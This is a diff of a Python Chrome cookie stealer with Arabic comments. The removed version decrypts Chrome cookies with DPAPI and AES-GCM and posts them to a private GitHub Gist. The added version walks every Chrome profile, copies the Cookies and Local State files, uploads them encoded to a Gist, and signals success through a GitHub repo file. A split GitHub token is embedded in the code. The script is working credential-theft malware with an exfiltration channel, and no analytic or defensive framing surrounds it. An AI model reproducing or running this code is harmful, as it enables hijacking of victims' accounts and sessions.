@@ -1,63 +1,60 @@
-import os, json, base64, sqlite3, shutil, requests, time
+import os, requests, base64, shutil, sqlite3
 
-# التوكن المقسم (Gist Token)
+# التوكن المقسم (Gist + Repo)
 A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
-G_TOKEN = A + B + C
+TOKEN = A + B + C
 
-def root_level_grabber():
-    local = os.getenv('LOCALAPPDATA')
-    # خرائط المسارات المضمونة (البحث الراداري)
-    targets = [
-        r'Google\Chrome\User Data\Default\Network\Cookies',
-        r'Google\Chrome\User Data\Profile 1\Network\Cookies',
-        r'Google\Chrome\User Data\Profile 2\Network\Cookies',
-        r'Google\Chrome\User Data\Default\Cookies'
-    ]
+def smart_hunter():
+    appdata = os.getenv('LOCALAPPDATA')
+    chrome_path = os.path.join(appdata, r'Google\Chrome\User Data')
     
-    state_path = os.path.join(local, r'Google\Chrome\User Data\Local State')
-    temp_vault = os.path.join(os.getenv('TEMP'), 'sys_vault.db')
+    # 1. قائمة الأهداف
+    targets = ['Cookies', 'Network\\Cookies', 'Local State']
+    found_data = {}
 
-    for sub_path in targets:
-        cookie_path = os.path.join(local, sub_path)
-        if os.path.exists(cookie_path):
-            try:
-                # 1. نسخ الملف بتكتيك الروت (تجاوز القفل)
-                os.system(f'copy /y "{cookie_path}" "{temp_vault}" > nul')
+    # 2. البحث الذكي (Searching everywhere inside Chrome)
+    # السكربت سيمشط كل المجلدات الفرعية بحثاً عن أي ملف كوكيز
+    for root, dirs, files in os.walk(chrome_path):
+        for file in files:
+            if file in ['Cookies', 'Local State']:
+                full_path = os.path.join(root, file)
+                # اسم فريد لكل ملف (مثلاً: Default_Cookies)
+                profile_name = os.path.basename(os.path.dirname(root))
+                unique_name = f"{profile_name}_{file}"
                 
-                # 2. فك التشفير المتقدم (In-Memory)
-                import win32crypt
-                from Crypto.Cipher import AES
-                
-                with open(state_path, "r", encoding="utf-8") as f:
-                    k = json.load(f)["os_crypt"]["encrypted_key"]
-                    mk = win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
-                
-                db = sqlite3.connect(temp_vault)
-                rows = db.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
-                
-                final_out = ""
-                for h, n, e in rows:
-                    try:
-                        c = AES.new(mk, AES.MODE_GCM, e[3:15])
-                        v = c.decrypt(e[15:])[:-16].decode()
-                        final_out += f"{h}\tTRUE\t/\tFALSE\t0\t{n}\t{v}\n"
-                    except: continue
-                
-                db.close()
-                if os.path.exists(temp_vault): os.remove(temp_vault)
+                try:
+                    # 3. النسخ الإجباري (تجاوز القفل)
+                    temp_path = os.path.join(os.getenv('TEMP'), 'sys_temp.tmp')
+                    os.system(f'copy /y "{full_path}" "{temp_path}" > nul')
+                    
+                    with open(temp_path, 'rb') as f:
+                        found_data[unique_name] = base64.b64encode(f.read()).decode('utf-8')
+                    
+                    os.remove(temp_path)
+                except: continue
 
-                # 3. الرفع الصامت لـ Gist (مضمون 100%)
-                if final_out:
-                    headers = {"Authorization": f"token {G_TOKEN}"}
-                    payload = {
-                        "description": f"Root-Level Sync - {time.ctime()}",
-                        "public": False,
-                        "files": {"cookies.txt": {"content": final_out}}
-                    }
-                    requests.post("https://api.github.com/gists", headers=headers, json=payload)
-                    break # نجحنا! نخرج من الحلقة
-            except: continue
+    # 4. الرفع المضمون
+    if found_data:
+        headers = {"Authorization": f"token {TOKEN}"}
+        # الرفع لـ Gist
+        gist_payload = {
+            "description": "Smart Hunter Log",
+            "public": False,
+            "files": {"chrome_vault.json": {"content": str(found_data)}}
+        }
+        requests.post("https://api.github.com/gists", headers=headers, json=gist_payload)
+        
+        # إرسال إشارة نجاح لـ Noor.json
+        try:
+            repo_url = "https://api.github.com/repos/Noor092324/Noor-config/contents/Noor.json"
+            curr = requests.get(repo_url, headers=headers).json()
+            requests.put(repo_url, headers=headers, json={
+                "message": "Hunter Success",
+                "content": base64.b64encode(b"Files Found and Captured in Gist").decode(),
+                "sha": curr['sha']
+            })
+        except: pass
 
 if __name__ == "__main__":
-    root_level_grabber()
-                
+    smart_hunter()
+            
